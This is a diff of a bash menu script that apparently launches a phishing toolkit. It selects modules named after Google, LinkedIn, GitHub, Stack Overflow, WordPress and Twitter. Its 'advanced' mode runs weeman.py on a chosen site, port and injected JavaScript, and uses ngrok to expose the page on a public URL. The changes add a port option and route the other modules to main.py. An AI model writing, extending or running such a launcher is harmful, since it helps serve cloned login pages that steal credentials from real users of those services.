@@ -9,7 +9,7 @@ arr[5]='\e[97m'   ; white=${arr[5]}
 grayterm='\e[1;40m'
 
 module=$(echo $1 | cut -d '/' -f 2 )
-if [[ $module != "fb" ]] && [[ $module != "google" ]] && [[ $module != "in" ]]  && [[ $module != "git" ]]  && [[ $module != "stack" ]]  && [[ $module != "wp" ]]  && [[ $module != "twitter" ]] && [[ $module != "advanced" ]]  ; then
+if [[ $module != "google" ]] && [[ $module != "in" ]]  && [[ $module != "git" ]]  && [[ $module != "stack" ]]  && [[ $module != "wp" ]]  && [[ $module != "twitter" ]] && [[ $module != "advanced" ]]  ; then
    echo -e "${red}[x] Wrong module name"
    exit
 fi   
@@ -57,6 +57,7 @@ while IFS= read -e -p "$( echo -e $white ; echo -e ${grayterm}{REBEL}➤[${white
              {
              echo -e '  Option\t\t\t\t|Value'
              echo -e '  ======\t\t\t\t|====='
+             echo -e "  port\t\t\t\t|$port"
              } | column -t -s "|"                           
           fi  
        elif [[ $( echo $cmd1 | cut -d " " -f 2 ) == "modules" ]] ; then
@@ -78,43 +79,29 @@ while IFS= read -e -p "$( echo -e $white ; echo -e ${grayterm}{REBEL}➤[${white
            js=$( echo $cmd1 | cut -d " " -f 3- )   
        fi           
   elif [[ $( echo $cmd1 | cut -d " " -f 1 ) == 'run' ]] ; then
-       if [[ $module == "fb" ]] ; then
-           echo -e "1\n2" | python main.py 
-       elif [[ $module == "google" ]] ; then
-           echo -e "2\n2" | python main.py   
-       elif [[ $module == "in" ]] ; then
-           echo -e "3" | python main.py 
-       elif [[ $module == "git" ]] ; then
-           echo -e "4" | python main.py 
-       elif [[ $module == "stack" ]] ; then
-           echo -e "4" | python main.py 
-       elif [[ $module == "wp" ]] ; then
-           echo -e "6" | python main.py 
-       elif [[ $module == "twitter" ]] ; then
-           echo -e "7" | python main.py 
-       elif [[ $module == "advanced" ]] ; then
-           if ! [[ $(pwd) =~ "weeman_mod" ]] ; then
-              cd weeman_mod
-           fi
+       if [[ $module == "advanced" ]] ; then
            if [[ $ngrok_url == "on" ]] ; then
-              ../Server/ngrok http $port > /dev/null &
-              sleep 10
+              ./Server/ngrok ./ngrok http $port > /dev/null & 
+              sleep 10 
               ngrok=$( curl -s -N http://127.0.0.1:4040/status | grep "https://[0-9a-z]*\.ngrok.io" -oh )
-	      echo -e "${red}[*] Ngrok URL : $ngrok "
+              cd weeman_mod
               if [[ $js == "nul" ]] ; then
-                  python weeman.py $site $port $ngrok 2> /dev/null
+                  python weeman.py $site $port $ngrok 2> /dev/null 
               else
                   python weeman.py $site $port $ngrok $js 2> /dev/null
-              fi
+              fi    
            else
+              cd weeman_mod
               if [[ $js == "nul" ]] ; then
                   python weeman.py $site $port 2> /dev/null
               else
                   python weeman.py $site $port $js 2> /dev/null
-              fi
+              fi  
            fi
+       else
+          python main.py $port $module
        fi
     else
        misc $cmd1
-    fi
-done
+    fi   
+done    
